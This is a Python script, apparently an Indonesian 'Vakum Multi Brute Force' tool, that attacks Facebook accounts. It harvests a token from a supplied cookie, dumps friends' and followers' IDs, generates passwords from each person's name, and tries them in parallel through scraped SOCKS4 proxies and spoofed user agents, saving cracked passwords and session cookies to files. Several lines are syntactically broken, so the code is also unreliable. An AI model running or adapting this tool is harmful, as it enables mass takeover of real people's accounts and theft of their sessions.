#!/usr/bin/python3
#-*-coding:utf-8-*-
# Created By Lukman-xd
# Update Pada Tanggal : 18 Febuari 2023

# Author : Lukman XD
# Github (Lukman Ganz) : https://github.com/Lukman-xd
# Facebook (Lukman 404) : https://www.facebook.com/arkanbigal.alkan
# Whatsap (Lukman xd) : +6283152417323
# Versions : v1.2.0

import requests, bs4, sys, os, random, time, re, json, subprocess
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from datetime import datetime

## Warna
Z = "\x1b[0;90m" # Hitam
P = "\x1b[0;97m" # Putih
M = "\x1b[0;91m" # Merah
H = "\x1b[0;92m" # Hijau
K = "\x1b[0;93m" # Kuning
B = "\x1b[0;94m" # Biru
U = "\x1b[0;95m" # Ungu
O = "\x1b[0;96m" # Biru Muda
N = '\x1b[0m'    

## Renspont
url_lookup = "https://lookup-id.com/"
url_mb = "https://mbasic.facebook.com"
url_ip = "https://www.httpbin.org/ip"
url_graph = "https://graph.facebook.com/{}"
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; SM-G532M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36"}
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

## Class Facebook ##
class Facebook:
	
	## Init Or Indectation ##
	def __init__(self):
		self.mb = "https://mbasic.facebook.com"
		self.hari_ini = datetime.now().strftime("%d-%B-%Y")
		self.methode, self.muda, self.uid, self.uid2 = [], [], [], []
		self.ugen, self.id, self.ok, self.cp, self.loop = [], [], [], [], 0
		self.ses=requests.Session()
		self.menu()
		
	## User Agent V1 ##
	def __ugen_1__(self):
		self.version = random.choice(['8.1.0','9','10','11','12','13'])
		self.random1 = random.randrange(73,100)
		self.random2 = random.randrange(4200,4900)
		self.random3 = random.randrange(40,150)
		self.random4 = random.randrange(120,430)
		self.useragent1 = f"Mozilla/5.0 (Linux; Android {self.version}; Infinix X6816C Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{self.random1}.0.{self.random2}.{self.random3} Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/396.0.0.14.82;]"
		self.useragent2 = f"Mozilla/5.0 (Linux; Android {self.version}; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{self.random1}.0.{self.random2}.{self.random3} Mobile Safari/537.36"
		self.useragent3 = f"Mozilla/5.0 (Linux; Android {self.version}; Redmi Note 8 Pro Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{self.random1}.0.{self.random2}.{self.random3} Mobile Safari/537.36"
		self.useragent4 = f"Mozilla/5.0 (Linux; U; Android {self.version}; zh-hk; PGJM10 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{self.random1}.0.{self.random2}.{self.random3} Mobile Safari/537.36 HeyTapBrowser/40.8.9.1"
		self.useragent5 = f"Mozilla/5.0 (Linux; U; Android {self.version}; en-US; vivo 1807 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{self.random1}.0.{self.random2}.{self.random3} UCBrowser/11.4.8.1012 Mobile Safari/537.36"
		self.useragent6 = f"Mozilla/5.0 (Linux; Android {self.version}; RMX3115 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{self.random1}.0.{self.random2}.{self.random3} Mobile Safari/537.36"
		self.useragent7 = f"Mozilla/5.0 (Linux; Android {self.version}; GT-810 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{self.random1}.0.{self.random2}.{self.random3} Safari/537.36"
		return random.choice([self.useragent1,self.useragent2,self.useragent3,self.useragent4,self.useragent5,self.useragent6,self.useragent7,])
	
	## Membersihkan Data ##
	def bersih(self):
		try:os.remove('data/token.txt')
		except:pass
		try:os.remove('data/cookies.txt')
		except:pass
	
	## Clear Layar (Termux) ##
	def clear(self):
		if "linux" in sys.platform.lower():
			try:os.system("clear")
			except:pass
		elif "win" in sys.platform.lower():
			try:os.system("cls")
			except:pass
		else:
			try:os.system("clear") 
			except:pass
	
	## Logo ##
	def banner(self):
		banner_logo_1 = ("   %s __     ____  __ ____  _____"%(O))
		banner_logo_2 = ("   %s \ \   / /  \/  | __ )|  ___|"%(O))
		banner_logo_3 = ("   %s  \ \ / /| |\/| |  _ \| |_     %s[ %sVakum Multi Brute Force %s]"%(O,P,H,P))
		benner_logo_4 = ("   %s   \ V / | |  | | |_) |  _|         %s[ %sVersion.1.2.1 %s]"%(O,P,H,P))
		banner_logo_5 = ("   %s    \_/  |_|  |_|____/|_|"%(O))
		self.clear();print(banner_logo_1);print(banner_logo_2);print(banner_logo_3);print(benner_logo_4);print(banner_logo_5)
	
	## Login ##
	def login(self):
		self.banner()
		print("\n%s[%s01%s]. Login menggunakan cookie\n[%s02%s]. Cara mendapatkan cookie\n[%s03%s]. Crack no login"%(P,H,P,H,P,H,P))
		mpn = input("\n%s[%s•%s] Pilih : "%(P,H,P))
		if mpn in ['1','01']:
			cokie = input("\n%s[%s•%s] Cookies : "%(P,H,P))
			try:
				self.ubah_bahasa(cokie)
				curl = self.ses.get("https://web.facebook.com/adsmanager?_rdc=1&_rdr", headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36", "Cookie": cokie})
				find = re.findall("act=(.*?)&nav_source", curl.text)
				if len(find) == 0:print("%s[%s!%s] Cookie kamu invalid"%(P,M,P));time.sleep(4);self.login()
				else:
					for x in find:
						jnck = self.ses.get(f"https://web.facebook.com/adsmanager/manage/campaigns?act={x}&nav_source=no_referrer",headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36", "Cookie": cokie})
						took = re.search("(EAAB\w+)", jnck.text).group(1)
						link = self.ses.get(f"{self.mb}/profile.php?v=info", cookies={"cookie": cokie}).text
						nama = re.search('id="mbasic_logout_button">Keluar \((.*?)\)</a>', str(link)).group(1)
						open("data/cookies.txt","w").write(cokie);open("data/token.txt","w").write(took)
						print(f"%s[%s•%s] Selamat %s{nama} %scookie kamu valid"%(P,H,P,H,P));time.sleep(5);self.menu()
			except requests.ConnectionError:print("%s[%s!%s] Tidak jaringan internet"%(P,M,P));exit()
		elif mpn in ['2','02']:
			print("%s[%s•%s] Kamu akan diarahkan menuju youtoub"%(P,H,P));time.sleep(2)
			os.system("xdg-open https://www.youtube.com/watch?v=3Y6xsMB3wRg");exit()
		elif mpn in ['3','03']:self.no_login()
		elif mpn in ['',' ']:print("%s[%s!%s] Input yang benar"%(P,M,P));exit()
		else:print("%s[%s!%s] Input yang benar"%(P,M,P));exit()
	
	## Menu ##
	def menu(self):
		self.banner()
		try:
			cookie = open("data/cookies.txt","r").read();token = open("data/token.txt","r").read()
		except FileNotFoundError:
			self.login()
		try:
			url = self.ses.get(f"https://graph.facebook.com/me?fields=name,id&access_token={token}",cookies={"cookie":cookie}).json()
			nama = url["name"]
			id = url["id"]
		except KeyError:
			self.bersih()
			print("\n%s[%s×%s] cookie kamu sudah kadaluarsa"%(P,M,P));time.sleep(3);self.login()
		except requests.ConnectionError:
			print("%s[%s!%s] Tidak jaringan internet"%(P,M,P));exit()
		print("""
%s[+] Nama   : %s%s
%s[+] Your id : %s%s

 %sSelamat datang %s%s%s di Vakum Multi Brute Force

[%s01%s]. Crack dari file
[%s02%s]. Dump teman publik
[%s03%s]. Dump total followers
[%s04%s]. Cek akun results crack
[%s05%s]. Checkpoint dectetor
[%s00%s]. Keluar (%shapus cookie%s)
"""%(P,H,nama,P,H,id,P,H,nama,P,H,P,H,P,H,P,H,P,H,P,M,P,Z,P))
		pml = input("%s[%s•%s] Pilih : "%(P,H,P))
		if pml in ['1','01']:self.crack_file()
		elif pml in ['2','02']:self.dump_publik(cookie,token)
		elif pml in ['3','03']:self.dump_followers(cookie,token)
		elif pml in ['0','00']:self.hapus_cookie()
		
	## Crack Dari File ##
	def crack_file(self):
		try:vin = os.listdir('Dump')
		except FileNotFoundError:print("\n%s[%s!%s] File tidak di temukan"%(P,M,P));exit()
		if len(vin)==0:print("\n%s[%s!%s] Anda tidak memiliki file dump"%(P,M,P));exit()
		else:
			cih, lol = 0, {}
			print('')
			for isi in vin:
				try:hem = open('Dump/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<100:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print("%s[%s%s%s]. %s {%s%s%s id}"%(P,H,nom,P,isi,H,len(hem),P))
				else:
					lol.update({str(cih):str(isi)})
					print("%s[%s%s%s]. %s {%s%s%s id}"%(P,H,cih,P,isi,H,len(hem),P))
			geeh = input("\n%s[%s•%s]. Pilih : "%(P,H,P))
			try:geh = lol[geeh]
			except KeyError:print("\n%s[%s×%s] pilih yang bener bro"%(P,M,P));exit()
			try:lin = open('Dump/'+geh,'r').read().splitlines()
			except:print("%s[%s×%s] File tidak di temukan"%(P,M,P));exit()
			for xid in lin:
				self.uid.append(xid)
			self.setting()
		
	## Membuat File Dump Publik ##
	def dump_publik(self,cookie,token):
		print("\n%s[%s•%s] Ketik '%sme%s' untuk dump dari teman sendiri"%(P,H,P,O,P))
		idz = input("%s[%s•%s] Username atau id : "%(P,H,P));self.user = self.convert(idz)
		nama = input("%s[%s•%s] Nama file : "%(P,H,P))
		self.file = (f"Dump/{nama}.txt").replace(' ', '_')
		self.simpan = open(self.file, 'w')
		try:
			url = self.ses.get("https://graph.facebook.com/%s?fields=friends.limit(90000)&access_token=%s"%(self.user,token),cookies={"cookie":cookie}).json()
			for x in url['friends']['data']:
				self.id.append(x['id']+'|'+x['name'])
				self.simpan.write(x['id']+'|'+x['name'] + '\n')
				time.sleep(0.0100)
			self.simpan.close()
			print("\n%s[+] File berhasil di simpan di %s%s"%(P,H,self.file))
			print("%s[+] Berhasil mengumpulkan %s%s%s id"%(P,H,len(self.id),P));exit()
		except (KeyError,IOError):
			os.remove(self.file)
			print("\n%s[%s×%s] Gagal dump id, kekungkinan id invalid"%(P,M,P));exit()
		
	## Membuat File Dump Followers ##
	def dump_followers(self,cookie,token):
		print("\n%s[%s•%s] Ketik '%sme%s' untuk dump dari total followers sendiri"%(P,H,P,O,P))
		idz = input("%s[%s•%s] Username atau id : "%(P,H,P));self.user = self.convert(idz)
		nama = input("%s[%s•%s] Nama file : "%(P,H,P))
		self.file = (f"Dump/{nama}.txt").replace(' ', '_')
		self.simpan = open(self.file, 'w')
		try:
			url = self.ses.get("https://graph.facebook.com/%s?fields=subscribers.fields(id,name).limit(90000)&access_token=%s"%(self.user,token),cookies={"cookie":cookie}).json()
			for x in url["subscribers"]["data"]:
				self.id.append(x['id']+'|'+x['name'])
				self.simpan.write(x['id']+'|'+x['name'] + '\n')
				time.sleep(0.0100)
			self.simpan.close()
			print("\n%s[+] File berhasil di simpan di %s%s"%(P,H,self.file))
			print("%s[+] Berhasil mengumpulkan %s%s%s id"%(P,H,len(self.id),P));exit()
		except (KeyError,IOError):
			os.remove(self.file)
			print("\n%s[%s×%s] Gagal dump id, kekungkinan id invalid"%(P,M,P));exit()
		
	## Conver Id ##
	def convert(self,idz):
		if "https" in idz or "facebook" in idz or "me" in idz:user = idz.split("/")[3]
		else:user=idz
		try:uid = re.findall(";rid=(\d+)&amp;",str(self.ses.get("https://m.facebook.com/"+user).text))[0]
		except:uid = idz
		return uid
	
	## Setting ##
	def setting(self):
		print("""
%s[%s01%s]. Crack dari akun tertua
[%s02%s]. Crack dari akun termuda
[%s03%s]. Crack dari akun randomt
"""%(P,H,P,H,P,H,P))
		hkm = input("%s[%s•%s] Pillih : "%(P,H,P))
		if hkm in ['1','01']:
			for self.tua in sorted(self.uid):
				self.uid2.append(self.tua)
		elif hkm in ['2','02']:
			for self.xxx in sorted(self.uid):
				self.muda.append(self.xxx)
			self.bcm=len(self.muda)
			self.bcmi=(self.bcm-1)
			for xmud in range(self.bcm):
				self.uid2.append(self.muda[self.bcmi])
				self.bcmi -=1
		elif hkm in ['3','03']:
			for self.bacot in self.uid:
				self.xxx = random.randint(0,len(self.uid2))
				self.uid2.insert(self.xxx,self.bacot)
		elif hkm in ['',' ']:print("\n%s[%s!%s] input yang benar"%(P,M,P));exit()
		else:print("\n%s[%s!%s] input yang benar"%(P,M,P));exit()
		print("""
%s[%s01%s]. Methode m.facebook
[%s02%s]. Methode free.facebook
[%s03%s]. Methode mbasic.facebook
"""%(P,H,P,H,P,H,P))
		prnt = input("%s[%s•%s] Methode : "%(P,H,P))
		if prnt in ['1','01']:self.methode.append('m.facebook.com')
		elif prnt in ['2','02']:self.methode.append('free.facebook.com')
		elif prnt in ['3','03']:self.methode.append('mbasic.facebook.com')
		elif prnt in ['',' ']:print("\n%s[%s!%s] input yang benar"%(P,M,P));exit()
		else:print("\n%s[%s!%s] input yang benar"%(P,M,P));exit()
		self.__ngocok__()
	
	## Setting Password ##
	def password(self):
		ua = random.choice(self.ugen)
		print('\n%s[%s+%s] User agent : %s%s'%(P,O,P,K,ua))
		print('')
		print("%s[%s!%s] Hasil ok tersimpan di OK/ok-%s.txt"%(P,M,P,self.hari_ini))
		print("%s[%s!%s] Hasil cp tersimpan di CP/cp-%s.txt"%(P,M,P,self.hari_ini))
		print("%s[%s•%s] Gunakan mode pesawat selama 5 detik setiap %s500 %sid\n"%(P,H,P,K,P))
		with ThreadPoolExecutor(max_workers=30) as axyz:
			for akun in self.uid2:
				id = akun.split('|')[0]
				nama = akun.split('|')[1].lower()
				sandi = nama.split(' ')
				try:
					if len(nama)<6:
						if len(sandi)<3:pass
						else:
							pwv = [nama, sandi[0]+sandi[1], sandi[0]+"123", sandi[0]+"12345"]
					else:
						if len(sandi)<3:
							pwv = [nama]
						else:
							pwv = [nama, sandi[0]+sandi[1], sandi[0]+"123", sandi[0]+"12345"]
					if 'm.facebook.com' in self.methode:
						axyz.submit(self.methode_mobile,id,pwv)
					elif 'free.facebook.com' in self.methode:
						axyz.submit(self.methode_free,id,pwv)
					elif 'mbasic.facebook.com' in self.methode:
						axyz.submit(self.methode_mbasic,id,pwv)
				except:pass
		print("""
%s[%s•%s] Crack selesai hasil ok : %s%s%s hasil cp : %s%s

%s[%s!%s] Info author and source code
     Author : %sLukman-xd%s
     Team   : %sThe•SQUAD team%s
     Source code created by %sLukman end %sRiki
     
%s[%s+%s] Terima kasih kepada%s
     Moch Aang Ardiansyah
     Rochmat Basuki
     Alvino Adijaya
     Fall Xavier
     Kall Xr
"""%(P,H,P,H,len(self.ok),P,K,len(self.cp),P,M,P,H,P,H,P,H,P,K,P,H));exit()

	## Methode Mobile ##
	def methode_mobile(self,idf,sandi):
		sys.stdout.write("\r%s Crack (%s%s%s) %s%s%s/%s%s%s [/]OK : %s%s%s [/]CP : %s%s%s"%(P,H,idf,P,H,self.loop,P,H,len(self.uid2),P,H,len(self.ok),P,K,len(self.cp),P))
		sys.stdout.flush()
		for pw in sandi:
			try:
				ses = requests.Session()
				ua = random.choice(self.ugen)
				prox = open("data/proxy.txt","r").read().splitlines()
				proxy = {f"http": "socks4://{random.choice(prox)}"}
				ses.headers.update({
					'Host': 'mobile.beta.facebook.com',
					'cache-control': 'private, no-cache, no-store, must-revalidate',
					'sec-ch-ua-mobile': '?1',
					'upgrade-insecure-requests': '1',
					'user-agent': ua,
					'accept': '*/*',
					'sec-fetch-site': 'same-origin',
					'sec-fetch-mode': 'cors',
					'sec-fetch-dest': 'manifest',
					'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
				})
				p = ses.get('https://mobile.beta.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&ref=wizard&_rdc=2&_rdr')
				dataa ={
					"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
					"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1)
					"uid":idf
					"next":"https://m.facebook.com/privacy/consent_framework/prompt/?consent_flow_name=gdp&consent_entry_source=gdp_delegated&consent_extra_params%5Bdefault_audience%5D=%22friends%22&consent_extra_params%5Bapp_id%5D=756701921753953&consent_extra_params%5Bauth_type%5D=%22rerequest%22&consent_extra_params%5Bis_first_party_account_linking%5D=false&consent_extra_params%5Bkid_directed_site%5D=false&consent_extra_params%5Blogger_id%5D=%22cebdd42b-5287-4bfb-aedb-a956fdc34396%22&consent_extra_params%5Bnext%5D=%22read%22&consent_extra_params%5Bnonce%5D=%22d6ef4770-84d6-4693-9dce-ed4616077242%22&consent_extra_params%5Bredirect_uri%5D=%22fbconnect%3A%5C%2F%5C%2Fcct.com.dubox.drive%22&consent_extra_params%5Bresponse_type%5D=%22id_token%2Ctoken%2Csigned_request%2Cgraph_domain%22&",
					"flow":"login_no_pin",
					"pass":pw,
				}
				koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
				heade={
					'Host': 'm.facebook.com',
					'cache-control': 'private, no-cache, no-store, must-revalidate',
					'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
					'sec-ch-ua-mobile': '?1',
					'sec-ch-ua-platform': '"Android"',
					'upgrade-insecure-requests': '1',
					'origin': 'https://m.facebook.com',
					'content-type': 'application/x-www-form-urlencoded',
					'user-agent': ua,
					'accept': '*/*',
					'x-requested-with': 'XMLHttpRequest',
					'sec-fetch-site': 'same-origin',
					'sec-fetch-mode': 'cors',
					'sec-fetch-dest': 'manifest',
					'referer': 'https://mobile.beta.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&ref=wizard&_rdc=2&_rdr',
					'accept-encoding': 'gzip, deflate, br',
					'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
				}
				po = ses.post('https://mobile.beta.facebook.com/login/device-based/validate-password/?shbl=0&amp;ref=wizard',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxy)
				if "checkpoint" in po.cookies.get_dict().keys():
					print("\r[CP] %s%s|%s|%s%s\n"%(K,idf,pw,ua,N))
					open('CP/cp-'+self.hari_ini+'.txt','a').write(idf+'|'+pw+'|'+ua+'\n')
					akun("[CP] %s|%s"%(idf,pw))
					self.cp.append(akun)
					break
				elif "c_user" in ses.cookies.get_dict().keys():
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print("\r[OK] %s%s|%s|%s%s\n"%(H,idf,pw,kuki,N))
					akun("[OK] %s|%s|%s"%(idf,pw,kuki))
					self.ok.append(akun)
					break
				else:continue
			except requests.exceptions.ConnectionError:
				time.sleep(31)
		self.loop+=1
		
	## Setting Ua ##
	def __ngocok__(self):
		print("""
%s[%s01%s]. USER AGENT V1
[%s02%s]. USER AGENT V2
[%s03%s]. USER AGENT V3
"""%(P,H,P,H,P,H,P))
		pnt = input("%s[%s•%s] Pilih : "%(P,H,P))
		if pnt in ['1','01']:self.ugen.append(self.__ugen_1__());self.proxy()
		self.password()
	
	## Ubah Bahasa ##
	def ubah_bahasa(self,cookie):
		try:
			link = self.ses.get(f"{self.mb}/language/",cookies={"cookie":cookie}).text
			data = parser(link, "html.parser")
			for x in data.find_all('form',{'method':'post'}):
				if "Bahasa Indonesia" in str(x):
					bahasa = {"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(link)).group(1),"jazoest" : re.search('name="jazoest" value="(.*?)"', str(link)).group(1), "submit"  : "Bahasa Indonesia"}
					self.ses.post(f"{self.mb}{x['action']}",data=bahasa,cookies={"cookie":cookie})
		except:pass
		
	## Proxy ##
	def proxy(self):
		try:
			prox=requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
			open('data/proxy.txt','w').write(prox)
		except Exception as e:
			print(e)
		
	## Remove Cookie ##
	def hapus_cookie(self):
		self.bersih()
		exit("%s[%s+%s] Proses penghapusan selesai, god by"%(P,O,P))
		
if __name__=='__main__':
	try:os.mkdir("data")
	except:pass
	try:os.mkdir("Dump")
	except:pass
	try:os.mkdir("CP")
	except:pass
	try:os.mkdir("OK")
	except:pass
	Facebook()
